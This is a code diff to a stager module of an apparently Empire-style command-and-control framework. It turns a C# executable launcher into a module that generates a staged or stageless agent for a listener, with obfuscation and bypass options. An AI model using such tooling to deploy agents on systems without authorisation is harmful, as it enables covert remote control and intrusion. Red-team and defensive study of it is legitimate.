@@ -10,21 +10,16 @@ class Stager(object):
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            "Name": "C# PowerShell Launcher",
+            "Name": "Generate Agent",
             "Authors": [
                 {
                     "Name": "Anthony Rose",
                     "Handle": "@Cx01N",
                     "Link": "https://twitter.com/Cx01N_",
                 },
-                {
-                    "Name": "Jake Krasnov",
-                    "Handle": "@hubbl3",
-                    "Link": "https://twitter.com/_Hubbl3",
-                },
             ],
-            "Description": "Generate a PowerShell C#  solution with embedded stager code that compiles to an exe",
-            "Comments": ["Based on the work of @bneg"],
+            "Description": "Generates an agent code instance for a specified listener, pre-staged, and register the agent in the database. This allows the agent to begin beconing behavior immediately.",
+            "Comments": [],
         }
 
         # any options needed by the stager, settable during runtime
@@ -34,15 +29,8 @@ class Stager(object):
             "Language": {
                 "Description": "Language of the stager to generate (powershell, csharp).",
                 "Required": True,
-                "Value": "csharp",
-                "SuggestedValues": ["powershell", "csharp", "python"],
-                "Strict": True,
-            },
-            "DotNetVersion": {
-                "Description": "Language of the stager to generate(powershell, csharp).",
-                "Required": True,
-                "Value": "net40",
-                "SuggestedValues": ["net35", "net40"],
+                "Value": "powershell",
+                "SuggestedValues": ["powershell", "python", "ironpython"],
                 "Strict": True,
             },
             "Listener": {
@@ -73,7 +61,7 @@ class Stager(object):
             "OutFile": {
                 "Description": "Filename that should be used for the generated output.",
                 "Required": True,
-                "Value": "Sharpire.exe",
+                "Value": "agent.txt",
             },
             "Obfuscate": {
                 "Description": "Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
@@ -95,7 +83,7 @@ class Stager(object):
             "Staged": {
                 "Description": "Allow agent to be staged",
                 "Required": True,
-                "Value": "True",
+                "Value": "False",
                 "SuggestedValues": ["True", "False"],
                 "Strict": True,
             },
@@ -121,23 +109,16 @@ class Stager(object):
         stager_retries = self.options["StagerRetries"]["Value"]
         listener_name = self.options["Listener"]["Value"]
         stager_retries = self.options["StagerRetries"]["Value"]
-        dot_net_version = self.options["DotNetVersion"]["Value"]
         bypasses = self.options["Bypasses"]["Value"]
         obfuscate = self.options["Obfuscate"]["Value"]
         obfuscate_command = self.options["ObfuscateCommand"]["Value"]
         outfile = self.options["OutFile"]["Value"]
 
-        obfuscate_script = False
-        if obfuscate.lower() == "true":
-            obfuscate_script = True
-
+        obfuscate_script = obfuscate.lower() == "true"
         staged = self.options["Staged"]["Value"].lower() == "true"
 
         if not staged:
-            launcher = strip_powershell_comments(
-                self.mainMenu.stagers.generate_stageless(self.options)
-            )
-            launcher = ps_convert_to_oneliner(strip_powershell_comments(launcher))
+            launcher = self.mainMenu.stagers.generate_stageless(self.options)
         else:
             # generate the PowerShell one-liner with all of the proper options set
             launcher = self.mainMenu.stagers.generate_launcher(
@@ -159,27 +140,4 @@ class Stager(object):
             if not launcher or launcher.lower() == "failed":
                 return "[!] Error in launcher command generation."
 
-        if language.lower() == "powershell":
-            directory = self.mainMenu.stagers.generate_powershell_exe(
-                launcher, dot_net_version=dot_net_version
-            )
-            with open(directory, "rb") as f:
-                code = f.read()
-            return code
-
-        elif language.lower() == "csharp":
-            directory = f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{launcher}.exe"
-            with open(directory, "rb") as f:
-                code = f.read()
-            return code
-
-        elif language.lower() == "python":
-            directory = self.mainMenu.stagers.generate_python_exe(
-                launcher, dot_net_version=dot_net_version
-            )
-            with open(directory, "rb") as f:
-                code = f.read()
-            return code
-
-        else:
-            return "[!] Invalid launcher language."
+        return launcher
